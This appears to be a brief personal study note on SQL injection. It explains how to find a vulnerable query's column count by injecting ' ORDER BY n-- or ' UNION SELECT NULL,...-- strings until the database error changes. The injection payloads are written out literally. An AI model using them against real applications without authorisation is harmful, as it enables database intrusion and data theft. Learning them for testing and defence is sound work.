---
tags:
  - security
---
# [[SQL Order By]] Method
```
' ORDER BY 1--
' ORDER BY 2--
... on and on
```
Until you reach some error like: `The ORDER BY position number 3 is out of range...`
# [[SQL Select|SQL UNION]] Method
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
etc.
```
Until you reach an error like: `All queries combined using a UNION, INTERSECT...`
When number of nulls matches number of columns, database returns an additional row is result set containing null values in each column.